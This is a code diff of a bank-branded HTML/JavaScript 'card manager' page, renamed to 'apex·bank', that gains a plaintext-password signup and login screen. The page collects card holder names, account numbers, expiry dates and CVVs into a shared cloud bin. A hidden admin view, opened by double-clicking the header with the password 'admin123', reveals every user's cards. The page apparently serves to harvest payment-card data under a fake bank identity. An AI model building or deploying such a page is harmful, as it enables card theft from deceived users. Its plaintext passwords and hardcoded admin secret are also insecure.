@@ -3,13 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>RPbank · card manager</title>
+  <title>apex·bank · card manager</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..700;1,14..32,400..700&display=swap" rel="stylesheet">
   <style>
-    /* same styles as before */
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
     body { background: linear-gradient(145deg, #f2f8ff 0%, #e3edf8 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 1.2rem; }
+
+    /* ─── MAIN APP ─── */
     .card-manager { max-width: 680px; width: 100%; background: rgba(255,255,255,0.88); backdrop-filter: blur(14px); border-radius: 48px; padding: 1.8rem; box-shadow: 0 30px 60px -15px rgba(0,30,50,0.25); border: 1px solid rgba(255,255,255,0.5); }
     .header { display: flex; align-items: center; gap: 12px; margin-bottom: 1.8rem; padding-bottom: 0.5rem; border-bottom: 2px solid rgba(0,70,140,0.08); cursor: pointer; }
     .header i { font-size: 2.2rem; color: #0a3d6b; background: rgba(10,61,107,0.07); padding: 12px; border-radius: 20px; }
@@ -18,7 +19,7 @@
     @keyframes pulse { 0% { opacity: 0.6; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.2); } 100% { opacity: 0.6; transform: scale(0.9); } }
     .input-group { margin-bottom: 1.2rem; display: flex; flex-direction: column; gap: 5px; }
     .input-group label { font-weight: 500; font-size: 0.85rem; color: #1a3d5c; display: flex; align-items: center; gap: 8px; }
-    .input-group input { background: rgba(255,255,255,0.7); border: 1.5px solid rgba(60,110,170,0.15); border-radius: 20px; padding: 14px 18px; font-size: 0.95rem; color: #0b263f; transition: all 0.2s; outline: none; }
+    .input-group input { background: rgba(255,255,255,0.7); border: 1.5px solid rgba(60,110,170,0.15); border-radius: 20px; padding: 14px 18px; font-size: 0.95rem; color: #0b263f; transition: all 0.2s; outline: none; width: 100%; }
     .input-group input:focus { border-color: #1f6eb0; background: white; box-shadow: 0 4px 14px rgba(20,90,170,0.10); }
     .row-duo { display: flex; gap: 16px; flex-wrap: wrap; }
     .row-duo .input-group { flex: 1; min-width: 130px; }
@@ -29,6 +30,8 @@
     .btn-success { background: #2e7d32; color: white; }
     .btn-success:hover { background: #388e3c; }
     .btn-secondary { background: rgba(255,255,255,0.7); color: #1b3c5c; }
+    .btn-danger { background: #c62828; color: white; }
+    .btn-danger:hover { background: #b71c1c; }
     .card-preview-area { margin: 1.5rem 0 1.2rem; background: linear-gradient(135deg, #0f2f4a, #1b4a6e); border-radius: 32px; padding: 1.5rem 1.8rem; color: white; box-shadow: 0 16px 32px -8px rgba(0,20,40,0.3); display: none; }
     .card-preview-area.visible { display: block; animation: cardReveal 0.35s ease; }
     @keyframes cardReveal { 0% { opacity: 0; transform: translateY(8px) scale(0.97); } 100% { opacity: 1; transform: translateY(0) scale(1); } }
@@ -57,7 +60,6 @@
     .eye-toggle { background: transparent; border: none; color: #3a7aa8; font-size: 1rem; padding: 4px 8px; border-radius: 30px; cursor: pointer; background: rgba(30,100,180,0.04); }
     .eye-toggle:hover { background: rgba(30,100,180,0.12); }
     .card-meta { display: flex; gap: 16px; font-size: 0.7rem; color: #3e6a8f; background: rgba(240,248,255,0.5); padding: 3px 14px 3px 12px; border-radius: 40px; margin-top: 3px; flex-wrap: wrap; }
-    .card-meta .user-tag { background: #e3edf8; padding: 0 10px; border-radius: 20px; font-size: 0.6rem; color: #1a5b85; }
     .delete-btn { background: transparent; border: none; color: #9bb9d6; font-size: 1.2rem; padding: 6px 10px; border-radius: 30px; cursor: pointer; }
     .delete-btn:hover { color: #c43e3e; background: rgba(200,50,50,0.04); }
     .empty-message { color: #6f8aa8; text-align: center; padding: 24px 0 16px; font-style: italic; display: flex; flex-direction: column; align-items: center; gap: 6px; }
@@ -65,6 +67,7 @@
     .status-bar { display: flex; justify-content: space-between; align-items: center; font-size: 0.7rem; color: #6f8aa8; padding: 6px 4px 0 4px; border-top: 1px solid rgba(60,110,170,0.06); margin-top: 10px; }
     .status-bar .online { color: #4caf50; }
     .status-bar .offline { color: #ef5350; }
+
     /* admin modal */
     .admin-modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,20,40,0.6); backdrop-filter: blur(12px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 1.5rem; }
     .admin-modal-overlay.active { display: flex; }
@@ -93,13 +96,245 @@
     .btn-admin-delete-all:hover { background: #b71c1c; }
     @keyframes fadeSlide { 0% { opacity: 0; transform: translateY(6px); } 100% { opacity: 1; transform: translateY(0); } }
     @media (max-width: 500px) { .card-manager { padding: 1.2rem 1rem; } .header h1 { font-size: 1.5rem; } .row-duo { flex-direction: column; } .btn { flex: 1 1 100%; } .action-bar { flex-direction: column; } }
+
+    /* ─── LOGIN / SIGNUP OVERLAYS ─── */
+    .auth-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 20, 40, 0.85);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      padding: 1.5rem;
+      animation: fadeIn 0.4s ease;
+    }
+    .auth-overlay.hidden { display: none; }
+    @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
+
+    .auth-box {
+      background: white;
+      border-radius: 48px;
+      max-width: 400px;
+      width: 100%;
+      padding: 2.5rem 2rem 2rem;
+      box-shadow: 0 50px 100px -20px rgba(0,0,0,0.5);
+      animation: slideUpAuth 0.5s ease;
+      text-align: center;
+    }
+    @keyframes slideUpAuth {
+      0% { opacity: 0; transform: scale(0.95) translateY(30px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    .auth-box .icon {
+      background: #0f3f66;
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1.2rem;
+      font-size: 2.2rem;
+      color: white;
+      box-shadow: 0 8px 24px rgba(15, 63, 102, 0.3);
+    }
+
+    .auth-box h2 {
+      font-size: 1.6rem;
+      color: #0b2b4a;
+      font-weight: 700;
+    }
+
+    .auth-box .subtitle {
+      color: #6f8aa8;
+      font-size: 0.9rem;
+      margin: 0.3rem 0 1.8rem;
+    }
+
+    .auth-box .input-group-custom {
+      margin-bottom: 1.2rem;
+      text-align: left;
+      position: relative;
+    }
+
+    .auth-box .input-group-custom label {
+      font-size: 0.8rem;
+      font-weight: 500;
+      color: #1a3d5c;
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .auth-box .input-group-custom input {
+      width: 100%;
+      padding: 14px 18px;
+      border: 2px solid #e8eef5;
+      border-radius: 30px;
+      font-size: 1rem;
+      outline: none;
+      transition: 0.2s;
+      background: #f8fbfe;
+    }
+
+    .auth-box .input-group-custom input:focus {
+      border-color: #1f6eb0;
+      background: white;
+      box-shadow: 0 0 0 4px rgba(31, 110, 176, 0.08);
+    }
+
+    .auth-box .auth-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 0.5rem;
+    }
+
+    .auth-box .btn-auth {
+      flex: 1;
+      padding: 14px;
+      border: none;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .auth-box .btn-auth-primary {
+      background: #0f3f66;
+      color: white;
+      box-shadow: 0 8px 18px -6px rgba(10,55,100,0.3);
+    }
+    .auth-box .btn-auth-primary:hover {
+      background: #1a527a;
+      transform: scale(1.02);
+    }
+
+    .auth-box .btn-auth-secondary {
+      background: #f0f4f9;
+      color: #1a3d5c;
+    }
+    .auth-box .btn-auth-secondary:hover {
+      background: #e0e8f0;
+    }
+
+    .auth-box .error-msg {
+      color: #c62828;
+      font-size: 0.8rem;
+      margin-top: 0.5rem;
+      display: none;
+      background: #ffebee;
+      padding: 8px 14px;
+      border-radius: 30px;
+    }
+    .auth-box .error-msg.show { display: block; }
+
+    .auth-box .switch-link {
+      margin-top: 1.2rem;
+      font-size: 0.9rem;
+      color: #1a3d5c;
+    }
+    .auth-box .switch-link a {
+      color: #0f3f66;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+    }
+    .auth-box .switch-link a:hover { text-decoration: underline; }
+
+    .auth-box .footer-note {
+      margin-top: 1.2rem;
+      font-size: 0.7rem;
+      color: #8aa5c2;
+      border-top: 1px solid #eef3f8;
+      padding-top: 1rem;
+    }
+
+    .logout-bar {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 0.5rem;
+    }
+    .logout-bar .btn-logout {
+      background: transparent;
+      border: none;
+      color: #6f8aa8;
+      font-size: 0.8rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      border-radius: 30px;
+      transition: 0.2s;
+    }
+    .logout-bar .btn-logout:hover {
+      background: rgba(200,50,50,0.05);
+      color: #c62828;
+    }
   </style>
 </head>
 <body>
-<div class="card-manager" id="app">
+
+<!-- ─── SIGNUP OVERLAY ─── -->
+<div class="auth-overlay" id="signupOverlay">
+  <div class="auth-box">
+    <div class="icon"><i class="fas fa-user-plus"></i></div>
+    <h2>Create Account</h2>
+    <p class="subtitle">Sign up to start managing your cards</p>
+    <div class="input-group-custom">
+      <label for="signupUsername"><i class="fas fa-user"></i> Username</label>
+      <input type="text" id="signupUsername" placeholder="Choose a username">
+    </div>
+    <div class="input-group-custom">
+      <label for="signupPassword"><i class="fas fa-lock"></i> Password</label>
+      <input type="password" id="signupPassword" placeholder="Create a password">
+    </div>
+    <div class="error-msg" id="signupError"><i class="fas fa-exclamation-circle"></i> <span id="signupErrorText">Error</span></div>
+    <div class="auth-buttons">
+      <button class="btn-auth btn-auth-primary" id="signupBtn"><i class="fas fa-arrow-right"></i> Sign Up</button>
+    </div>
+    <div class="switch-link">Already have an account? <a id="gotoLoginFromSignup">Login</a></div>
+    <div class="footer-note">Your data is stored locally</div>
+  </div>
+</div>
+
+<!-- ─── LOGIN OVERLAY ─── -->
+<div class="auth-overlay hidden" id="loginOverlay">
+  <div class="auth-box">
+    <div class="icon"><i class="fas fa-lock"></i></div>
+    <h2>Welcome Back</h2>
+    <p class="subtitle">Login to access your cards</p>
+    <div class="input-group-custom">
+      <label for="loginUsername"><i class="fas fa-user"></i> Username</label>
+      <input type="text" id="loginUsername" placeholder="Enter username">
+    </div>
+    <div class="input-group-custom">
+      <label for="loginPassword"><i class="fas fa-lock"></i> Password</label>
+      <input type="password" id="loginPassword" placeholder="Enter password">
+    </div>
+    <div class="error-msg" id="loginError"><i class="fas fa-exclamation-circle"></i> <span id="loginErrorText">Invalid credentials</span></div>
+    <div class="auth-buttons">
+      <button class="btn-auth btn-auth-primary" id="loginBtn"><i class="fas fa-arrow-right"></i> Login</button>
+    </div>
+    <div class="switch-link">Don't have an account? <a id="gotoSignupFromLogin">Sign Up</a></div>
+    <div class="footer-note">Secure access only</div>
+  </div>
+</div>
+
+<!-- ─── MAIN APP ─── -->
+<div class="card-manager" id="app" style="display: none;">
+  <!-- Logout button -->
+  <div class="logout-bar">
+    <button class="btn-logout" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+  </div>
+
   <div class="header" id="adminTriggerHeader">
     <i class="fas fa-credit-card"></i>
-    <h1>Smart·bank <small style="font-size:0.7rem; -webkit-text-fill-color: #4b7191; font-weight:400;">cards</small></h1>
+    <h1>apex·bank <small style="font-size:0.7rem; -webkit-text-fill-color: #4b7191; font-weight:400;">cards</small></h1>
     <span class="online-dot" id="statusDot" style="background:#ff9800;"></span>
   </div>
 
@@ -129,7 +364,7 @@
 
   <div class="card-preview-area" id="cardPreview">
     <div class="card-preview-header">
-      <span class="brand"><i class="fas fa-university"></i> rp-X·ba</span>
+      <span class="brand"><i class="fas fa-university"></i> apex·bank</span>
       <span class="chip"><i class="fas fa-microchip"></i></span>
     </div>
     <div class="card-preview-body">
@@ -139,7 +374,7 @@
       </div>
       <div class="preview-row">
         <span class="preview-label">Account number</span>
-        <span class="preview-value account" id="previewAcc">Smart Bank</span>
+        <span class="preview-value account" id="previewAcc">—</span>
       </div>
       <div class="preview-meta">
         <div class="preview-meta-item">
@@ -188,7 +423,185 @@
 
 <script>
   // ════════════════════════════════════════════════════════════
-  // 🔧 CONFIGURATION – ඔබගේ JSONBin credentials 
+  // 🔧 AUTH SYSTEM (localStorage)
+  // ════════════════════════════════════════════════════════════
+  const USERS_KEY = 'apexUsers';
+  const SESSION_KEY = 'apexSession';
+
+  function getUsers() {
+    try {
+      return JSON.parse(localStorage.getItem(USERS_KEY)) || {};
+    } catch { return {}; }
+  }
+
+  function saveUsers(users) {
+    localStorage.setItem(USERS_KEY, JSON.stringify(users));
+  }
+
+  function getSession() {
+    return localStorage.getItem(SESSION_KEY) || null;
+  }
+
+  function setSession(username) {
+    localStorage.setItem(SESSION_KEY, username);
+  }
+
+  function clearSession() {
+    localStorage.removeItem(SESSION_KEY);
+  }
+
+  function signup(username, password) {
+    const users = getUsers();
+    if (users[username]) {
+      return { success: false, message: 'Username already exists.' };
+    }
+    users[username] = { password: password };
+    saveUsers(users);
+    return { success: true };
+  }
+
+  function login(username, password) {
+    const users = getUsers();
+    if (!users[username]) {
+      return { success: false, message: 'User not found.' };
+    }
+    if (users[username].password !== password) {
+      return { success: false, message: 'Incorrect password.' };
+    }
+    setSession(username);
+    return { success: true };
+  }
+
+  // ─── DOM refs for auth ────────────────────────────────────
+  const signupOverlay = document.getElementById('signupOverlay');
+  const loginOverlay = document.getElementById('loginOverlay');
+  const signupUsername = document.getElementById('signupUsername');
+  const signupPassword = document.getElementById('signupPassword');
+  const signupBtn = document.getElementById('signupBtn');
+  const signupError = document.getElementById('signupError');
+  const signupErrorText = document.getElementById('signupErrorText');
+  const loginUsername = document.getElementById('loginUsername');
+  const loginPassword = document.getElementById('loginPassword');
+  const loginBtn = document.getElementById('loginBtn');
+  const loginError = document.getElementById('loginError');
+  const loginErrorText = document.getElementById('loginErrorText');
+  const gotoLoginFromSignup = document.getElementById('gotoLoginFromSignup');
+  const gotoSignupFromLogin = document.getElementById('gotoSignupFromLogin');
+  const logoutBtn = document.getElementById('logoutBtn');
+  const app = document.getElementById('app');
+
+  // ─── Auth UI helpers ──────────────────────────────────────
+  function showSignup() {
+    signupOverlay.classList.remove('hidden');
+    loginOverlay.classList.add('hidden');
+    signupError.classList.remove('show');
+  }
+
+  function showLogin() {
+    loginOverlay.classList.remove('hidden');
+    signupOverlay.classList.add('hidden');
+    loginError.classList.remove('show');
+  }
+
+  function showApp() {
+    signupOverlay.classList.add('hidden');
+    loginOverlay.classList.add('hidden');
+    app.style.display = 'block';
+    // Initialize app after login
+    if (typeof initApp === 'function') initApp();
+  }
+
+  function logout() {
+    clearSession();
+    app.style.display = 'none';
+    showLogin();
+    loginUsername.value = '';
+    loginPassword.value = '';
+  }
+
+  // ─── Auth event listeners ─────────────────────────────────
+  signupBtn.addEventListener('click', function() {
+    const username = signupUsername.value.trim();
+    const password = signupPassword.value.trim();
+    if (!username || !password) {
+      signupErrorText.textContent = 'Please fill in all fields.';
+      signupError.classList.add('show');
+      return;
+    }
+    const result = signup(username, password);
+    if (!result.success) {
+      signupErrorText.textContent = result.message;
+      signupError.classList.add('show');
+      return;
+    }
+    // Auto-login after signup
+    login(username, password);
+    showApp();
+  });
+
+  loginBtn.addEventListener('click', function() {
+    const username = loginUsername.value.trim();
+    const password = loginPassword.value.trim();
+    if (!username || !password) {
+      loginErrorText.textContent = 'Please fill in all fields.';
+      loginError.classList.add('show');
+      return;
+    }
+    const result = login(username, password);
+    if (!result.success) {
+      loginErrorText.textContent = result.message;
+      loginError.classList.add('show');
+      return;
+    }
+    showApp();
+  });
+
+  gotoLoginFromSignup.addEventListener('click', function(e) {
+    e.preventDefault();
+    showLogin();
+  });
+
+  gotoSignupFromLogin.addEventListener('click', function(e) {
+    e.preventDefault();
+    showSignup();
+  });
+
+  logoutBtn.addEventListener('click', function() {
+    logout();
+  });
+
+  // Enter key support
+  signupPassword.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') signupBtn.click();
+  });
+  loginPassword.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') loginBtn.click();
+  });
+
+  // ─── Check session on load ────────────────────────────────
+  (function checkSession() {
+    const sessionUser = getSession();
+    if (sessionUser) {
+      // Verify user still exists
+      const users = getUsers();
+      if (users[sessionUser]) {
+        showApp();
+        return;
+      } else {
+        clearSession();
+      }
+    }
+    // Show login by default, but if no users exist, show signup
+    const users = getUsers();
+    if (Object.keys(users).length === 0) {
+      showSignup();
+    } else {
+      showLogin();
+    }
+  })();
+
+  // ════════════════════════════════════════════════════════════
+  // 🔧 JSONBin CONFIG
   // ════════════════════════════════════════════════════════════
   const CONFIG = {
     BIN_ID: '6a595096f5f4af5e2999bb42',
@@ -196,7 +609,7 @@
   };
 
   // ════════════════════════════════════════════════════════════
-  // මෙතැන් සිට code එක 
+  // MAIN APP CODE (only runs after login)
   // ════════════════════════════════════════════════════════════
 
   const holderInput = document.getElementById('cardHolder');
@@ -231,9 +644,10 @@
   }
   deviceIdText.textContent = deviceId;
 
-  let allCards = []; // හැම cards එකම (cloud එකෙන්)
+  let allCards = [];
   const visibilityMap = new Map();
   let isSyncing = false;
+  let appInitialized = false;
 
   // ─── helpers ──────────────────────────────────────────────
   function formatCardNumber(raw) {
@@ -268,9 +682,7 @@
 
   // ─── render cards (USER ට පෙනෙන්නේ ඔහුගේම cards විතරයි) ──
   function renderCards() {
-    // 🔥 FIX: filter by deviceId – user ට පෙනෙන්නේ ඔහුගේම cards විතරයි
     const myCards = allCards.filter(card => card.deviceId === deviceId);
-    
     cardListEl.innerHTML = '';
     if (myCards.length === 0) {
       cardListEl.innerHTML = `<li class="empty-message"><i class="fas fa-credit-card"></i> No cards saved yet</li>`;
@@ -323,8 +735,6 @@
       cvvSpan.innerHTML = `<i class="fas fa-lock"></i> ${card.cvv || '•••'}`;
       metaRow.appendChild(expSpan);
       metaRow.appendChild(cvvSpan);
-      // device tag එක user interface එකේ නොපෙන්වන්න (අවශ්‍ය නැහැ)
-      // නමුත් ඕනනම් පෙන්වන්න පුළුවන්
 
       infoDiv.appendChild(topRow);
       infoDiv.appendChild(numRow);
@@ -379,7 +789,7 @@
     visibilityMap.set(newCard.id, false);
     renderCards();
     updatePreview(cleanHolder, cleanAcc, cleanExp, cleanCvv);
-    saveToJsonBin(); // auto-sync
+    saveToJsonBin();
     return true;
   }
 
@@ -468,7 +878,7 @@
     }
   }
 
-  // ─── admin modal (හැම cards එකම පෙන්වයි) ────────────────
+  // ─── admin modal ──────────────────────────────────────────
   function renderAdminModal() {
     if (allCards.length === 0) {
       adminContent.innerHTML = `<div class="admin-empty"><i class="fas fa-database" style="font-size:2rem;display:block;margin-bottom:10px;color:#b0cbdf;"></i> No card data available</div>`;
@@ -542,7 +952,7 @@
   // ─── secret admin trigger ────────────────────────────────
   adminTriggerHeader.addEventListener('dblclick', function() {
     const password = prompt('Enter admin password:');
-    if (password === 'rptk2011') {
+    if (password === 'admin123') {
       openAdminModal();
     } else if (password !== null) {
       alert('Incorrect password.');
@@ -570,17 +980,26 @@
     });
   });
 
-  // ─── init ──────────────────────────────────────────────────
-  (async function init() {
+  // ─── init function (called after login) ────────────────────
+  async function initApp() {
+    if (appInitialized) return;
+    appInitialized = true;
     await loadFromJsonBin();
-    // No sample card added – start completely empty
-    // User will add cards manually
-  })();
+    // No sample cards – start empty
+    console.log('🟦 apex·bank initialized for user:', getSession());
+  }
 
-  console.log('🟦 smart·bank with JSONBin (privacy fix, empty start)');
-  console.log('📱 Device ID:', deviceId);
-  console.log('🔑 Admin: double-click header → password: rptk2011');
-  console.log('✅ User sees only their own cards. Admin sees all cards.');
+  // Expose initApp globally so auth can call it
+  window.initApp = initApp;
+
+  // If already logged in (session exists), init directly
+  if (getSession()) {
+    // but app might already be shown; we call init after showApp
+    // showApp already calls initApp
+  }
+
+  console.log('🟦 apex·bank with user signup/login');
+  console.log('🔑 Admin: double-click header → password: admin123');
 </script>
 </body>
 </html>
